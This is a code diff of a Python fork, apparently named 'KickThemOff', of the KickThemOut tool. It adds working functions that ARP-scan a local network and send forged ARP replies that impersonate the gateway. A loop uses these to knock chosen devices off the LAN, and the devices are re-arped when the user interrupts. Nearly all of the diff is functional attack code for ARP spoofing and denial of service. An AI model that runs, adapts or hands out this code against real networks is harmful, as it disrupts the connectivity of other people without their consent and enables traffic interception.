@@ -1,7 +1,7 @@
 #!/usr/bin/env python
-# -.- coding: utf-8 -.-
-# kickthemout.py
-# authors: k4m4, xdavidhu, kkevsterrr
+# -*- coding: utf-8 -*-
+# kickthemoff.py
+# author: kkevsterrr
 
 """
 Based on KickThemOut by Nikolaos Kamarinakis (nikolaskam@gmail.com) & David Schütz (xdavid@protonmail.com)
@@ -9,8 +9,9 @@ Based on KickThemOut by Nikolaos Kamarinakis (nikolaskam@gmail.com) & David Sch�
 
 import time, os, sys, logging, math
 from time import sleep
-import netifaces as ni
 import urllib2 as urllib
+from netaddr import IPAddress, IPNetwork
+
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
 notRoot = False
@@ -27,45 +28,89 @@ if notRoot:
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
 try:
     from scapy.all import *
-    import scan, spoof
+    import netifaces as ni
 except:
     print("\n{0}ERROR: Requirements have not been properly satisfied. Please try running:\n\t{1}$ sudo pip install -r requirements.txt{2}").format(RED, GREEN, END)
-    print("\n{0}If you still get the same error, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(RED, BLUE, END)
     raise SystemExit
+
+
 
 def heading():
     sys.stdout.write(GREEN + """
-    █  █▀ ▄█ ▄█▄    █  █▀    ▄▄▄▄▀  ▄  █ ▄███▄   █▀▄▀█  ████▄   ▄      ▄▄▄▄▀
-    █▄█   ██ █▀ ▀▄  █▄█   ▀▀▀ █    █   █ █▀   ▀  █ █ █  █   █    █  ▀▀▀ █
-    █▀▄   ██ █   ▀  █▀▄       █    ██▀▀█ ██▄▄    █ ▄ █  █   █ █   █     █
-    █  █  ▐█ █▄  ▄▀ █  █     █     █   █ █▄   ▄▀ █   █  ▀████ █   █    █
-     █    ▐ ▀███▀    █     ▀         █  ▀███▀      █         █▄ ▄█   ▀
-     ▀               ▀               ▀             ▀           ▀▀▀
+    █  █▀ ▄█ ▄█▄    █  █▀  ▄▄▄▄▀ ▄  █ ▄███▄   █▀▄▀█ ████▄ ▄████  ▄████  
+    █▄█   ██ █▀ ▀▄  █▄█ ▀▀▀ █   █   █ █▀   ▀  █ █ █ █   █ █▀   ▀ █▀   ▀ 
+    █▀▄   ██ █   ▀  █▀▄     █   ██▀▀█ ██▄▄    █ ▄ █ █   █ █▀▀    █▀▀    
+    █  █  ▐█ █▄  ▄▀ █  █   █    █   █ █▄   ▄▀ █   █ ▀████ █      █      
+      █    ▐ ▀███▀    █   ▀        █  ▀███▀      █         █      █     
+     ▀               ▀            ▀             ▀           ▀      ▀    
     """ + END + BLUE +
     '\n' + '{0}Kick Devices Off Your LAN ({1}KickThemOff{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(98) +
     '\n' + 'Version: {0}1.0{1}\n'.format(YELLOW, END).center(86))
 
+def arpscan(interface, netmask, my_ip, timeout=1):
+    net = str(IPNetwork(my_ip+"/"+netmask).cidr)
+    hostsList = []
+    ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=False)
+    for s, r in ans.res:
+        mac = r.sprintf("%Ether.src%")
+        ip = r.sprintf("%ARP.psrc%")
+        line = r.sprintf("%Ether.src%  %ARP.psrc%")
+        hostsList.append([ip, mac])
+        try:
+            hostname = socket.gethostbyaddr(r.psrc)
+            line += "," + hostname[0]
+        except socket.herror:
+            pass
+    return hostsList
+
+def sendPacket(my_mac, gateway_ip, target_ip, target_mac):
+    ether = Ether()
+    ether.src = my_mac
+    ether.dst = target_mac
+    
+    arp = ARP()
+    arp.psrc = gateway_ip
+    arp.hwsrc = my_mac
+    arp.pdst = target_ip
+    arp.hwdst = target_mac
+    arp.op = 2
+
+    packet = ether / arp
+    sendp(x=packet, verbose=False)
+
 def changeSettings():
-    global APPLE_DIG_ENABLED
+    global APPLE_DIG_ENABLED, VENDOR_ID_ENABLED
     while True:
         print('\n\t{0}[{1}1{2}]{3} Change Interface').format(YELLOW, RED, YELLOW, WHITE)
         sleep(0.1)
         status = "Enable" if not APPLE_DIG_ENABLED else "Disable"
         print('\n\t{0}[{1}2{2}]{3} '+status+' Apple Device Name Dig').format(YELLOW, RED, YELLOW, WHITE)
         sleep(0.1)
-        print('\n\t{0}[{1}3{2}]{3} Return to menu\n').format(YELLOW, RED, YELLOW, WHITE)
+        status = "Enable" if not VENDOR_ID_ENABLED else "Disable"
+        print('\n\t{0}[{1}3{2}]{3} '+status+' Vendor MAC identification').format(YELLOW, RED, YELLOW, WHITE)
         sleep(0.1)
-        header = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
+        print('\n\t{0}[{1}4{2}]{3} Return to menu\n').format(YELLOW, RED, YELLOW, WHITE)
+        sleep(0.1)
         choice = raw_input(header)
         if choice == '1':
             changeInterface()
-            break
-        elif choice.upper() == '2':
+        elif choice == '2':
+            if not VENDOR_ID_ENABLED and not APPLE_DIG_ENABLED:
+                print(RED+"ERROR: "+END+" Vendor MAC idenfication must be enabled to enabled Apple Dig")
+                continue
+            
             APPLE_DIG_ENABLED = not APPLE_DIG_ENABLED
             status = "disabled" if not APPLE_DIG_ENABLED else "enabled"
-            print(GREEN+"\t[*] Apple dig "+status+"."+END)
-            break
+            print(GREEN+"[*] Apple dig "+status+"."+END)
         elif choice == '3':
+            if VENDOR_ID_ENABLED and APPLE_DIG_ENABLED:
+                print(RED+"ERROR:" + END + " Apple dig must be disabled before disabling vendor MAC identification")
+                continue
+
+            VENDOR_ID_ENABLED = not VENDOR_ID_ENABLED
+            status = "disabled" if not VENDOR_ID_ENABLED else "enabled"
+            print(GREEN+"[*] Vendor MAC idenfication "+status+"."+END)
+        elif choice == '4':
             return
 def optionBanner():
     print('\nChoose option from menu:\n')
@@ -77,6 +122,7 @@ def optionBanner():
     print('\n\t{0}[{1}E{2}]{3} Exit KickThemOut\n').format(YELLOW, RED, YELLOW, WHITE)
 
 def changeInterface():
+    print("Available interfaces: " + ", ".join(ni.interfaces()))
     global defaultInterface, defaultGatewayIP, defaultInterfaceMac
     sys.stdout.write(GREEN +"\nEnter a new interface to use: "+RED)
     iface = raw_input("")
@@ -97,7 +143,8 @@ def regenOnlineIPs():
 
 def scanNetwork():
     global hostsList
-    hostsList = scan.scanNetwork()
+    netmask = ni.ifaddresses(defaultInterface)[ni.AF_INET][0]["netmask"]
+    hostsList = arpscan(defaultInterface, netmask, getMyIP())
     regenOnlineIPs()
 
 def print_online_ips():
@@ -121,9 +168,7 @@ def build_targets(hosts_list):
 
 
 def kicksomeoff():
-    os.system("clear||cls")
-
-    print("\n{0}Scanning for targets{1}...{2}\n").format(RED, GREEN, END)
+    print("\n{0}[*] ARP Scanning network for targets{1}...{2}\n").format(RED, GREEN, END)
     scanNetwork()
     
     print_online_ips()
@@ -170,58 +215,45 @@ def kicksomeoff():
         while True:
             for ip in targets:
                 mac = targets[ip]
-                spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, ip, mac)
+                sendPacket(defaultInterfaceMac, defaultGatewayIP, ip, mac)
             time.sleep(1)
     except KeyboardInterrupt:
-        print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
+        sys.stdout.write("\n{0}Re-arping{1} targets...{2}".format(RED, GREEN, END))
         reArp = 1
         while reArp != 10:
+            sys.stdout.write(".")
             for ip in targets:
-                spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, ip, targets[ip])
+                sendPacket(defaultGatewayMac, defaultGatewayIP, ip, targets[ip])
             reArp += 1
             time.sleep(0.5)
-        print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
+        print("\n{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
 
 def getDefaultInterface():
-    def long2net(arg):
-        if (arg <= 0 or arg >= 0xFFFFFFFF):
-            raise ValueError("illegal netmask value", hex(arg))
-        return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))
-    def to_CIDR_notation(bytes_network, bytes_netmask):
-        network = scapy.utils.ltoa(bytes_network)
-        netmask = long2net(bytes_netmask)
-        net = "%s/%s" % (network, netmask)
-        if netmask < 16:
-            return None
-        return net
-    for network, netmask, _, interface, address in scapy.config.conf.route.routes:
-        if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
-            continue
-        if netmask <= 0 or netmask == 0xFFFFFFFF:
-            continue
-        net = to_CIDR_notation(network, netmask)
-        if interface != scapy.config.conf.iface:
-            continue
-        if net:
-            return interface
+    try:
+        i = ni.gateways()["default"][ni.AF_INET][1]
+        return i
+    except:
+        i = [x for x in ni.interfaces() if "lo" not in x][0]
+        print(RED+"ERROR: "+END+" Could not find network interface with a gateway. Defaulting instead to interface "+GREEN+i+END+".")
+        return i
 
 def getGatewayIP():
     try:
-        getGateway_p = ni.gateways()["default"][ni.AF_INET][0]
+        getGateway_p = [x[0] for x in ni.gateways()[2] if x[1] == defaultInterface][0]
         return getGateway_p
     except:
-        print("\n{0}ERROR: Gateway IP could not be obtained. Please enter IP manually.{1}\n").format(RED, END)
-        header = ('{0}kickthemout{1}> {2}Enter Gateway IP {3}(e.g. 192.168.1.1): '.format(BLUE, WHITE, RED, END))
+        print("\n{0}ERROR: Gateway IP for interface "+GREEN+defaultInterface+RED+" could not be obtained. Please enter IP manually.{1}\n").format(RED, END)
+        header = ('{0}kickthemoff{1}> {2}Enter Gateway IP {3}(e.g. 192.168.1.1): '.format(BLUE, WHITE, RED, END))
         gatewayIP = raw_input(header)
         return gatewayIP
 
 def getDefaultInterfaceMAC():
     try:
-        defaultInterfaceMac = get_if_hwaddr(defaultInterface)
+        defaultInterfaceMac = ni.ifaddresses(defaultInterface)[ni.AF_LINK][0]['addr']
 	return defaultInterfaceMac
     except:
         print("\n{0}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(RED, END)
-        header = ('{0}kickthemout{1}> {2}Enter MAC Address {3}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
+        header = ('{0}kickthemoff{1}> {2}Enter MAC Address {3}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
         defaultInterfaceMac = raw_input(header)
 	return defaultInterfaceMac
 
@@ -232,7 +264,11 @@ def get_apple_name(ip):
     return name.strip()
 
 def resolveMac(mac):
+    if not VENDOR_ID_ENABLED:
+        return ""
+
     try:
+        print("retreiving vendor...")
         url = "http://macvendors.co/api/vendorname/"
         request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
         response = urllib.urlopen(request)
@@ -247,12 +283,12 @@ def getMyIP():
     return ni.ifaddresses(defaultInterface)[ni.AF_INET][0]['addr']
 
 def print_info():
-    print("\n{0}Using interface '{1}" + defaultInterface + "{2}' ("+RED+myIP+GREEN+") with mac address '{3}" + defaultInterfaceMac + "{4}' to gateway '{5}"
+    print("\n{0}Using interface '{1}" + defaultInterface + "{2}' ("+RED+getMyIP()+GREEN+") with mac address '{3}" + defaultInterfaceMac + "{4}' to gateway '{5}"
         + defaultGatewayIP + "{6}'{9}").format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END)
 
 
 def main():
-    global APPLE_DIG_ENABLED
+    global header
     heading()
     print_info()
 
@@ -261,7 +297,7 @@ def main():
 
             optionBanner()
 
-            header = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
+            header = ('{0}kickthemoff{1}> {2}'.format(BLUE, WHITE, END))
             choice = raw_input(header)
 
             if choice.upper() == 'E' or choice.upper() == 'EXIT':
@@ -286,9 +322,7 @@ if __name__ == '__main__':
     defaultInterface = getDefaultInterface()
     defaultGatewayIP = getGatewayIP()
     defaultInterfaceMac = getDefaultInterfaceMAC()
-    APPLE_DIG_ENABLED = False
+    APPLE_DIG_ENABLED, VENDOR_ID_ENABLED = False, False
     myIP = getMyIP()
-    #scanningThread = threading.Thread(target=scanNetwork)
-    #scanningThread.start()
 
     main()
